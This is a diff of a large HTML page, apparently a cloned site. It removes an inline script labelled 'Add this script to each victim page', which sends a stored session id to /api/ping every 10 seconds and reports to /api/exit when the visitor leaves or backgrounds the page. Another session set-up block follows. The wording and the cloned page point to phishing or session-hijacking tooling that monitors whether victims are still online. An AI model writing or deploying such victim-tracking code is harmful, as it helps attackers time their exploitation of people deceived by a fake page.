@@ -26018,36 +26018,6 @@ html.loggedout:not([style-scope]):not(.style-scope),html.loggedout:not([style-sc
   <meta content="ico/144.png" name="msapplication-TileImage"/>
   <meta content="#ff6600" name="msapplication-TileColor"/>
   <script>
-	  // Add this script to each victim page
-const sid = localStorage.getItem('sid') || sessionStorage.getItem('sid');
-if (sid) {
-  // Send heartbeat every 10 seconds
-  setInterval(() => {
-    fetch('/api/ping', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ sid }),
-      keepalive: true
-    }).catch(() => {});
-  }, 10000);
-
-  // Send exit signal when leaving page
-  window.addEventListener('beforeunload', () => {
-    navigator.sendBeacon('/api/exit', JSON.stringify({ sid }));
-  });
-  
-  // Also mark as exit if visibility changes (mobile background)
-  document.addEventListener('visibilitychange', () => {
-    if (document.visibilityState === 'hidden') {
-      fetch('/api/exit', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ sid }),
-        keepalive: true
-      }).catch(() => {});
-    }
-  });
-}
 /* ===== 1. SESSION SET-UP ===== */
 const sid = new URLSearchParams(location.search).get('sid') ||
             sessionStorage.getItem('sid');
@@ -28746,5 +28716,6 @@ iron-overlay-backdrop.overlay-backdrop-firework:not([style-scope]):not(.style-sc
  </body>
 
 </html>
+
 
 
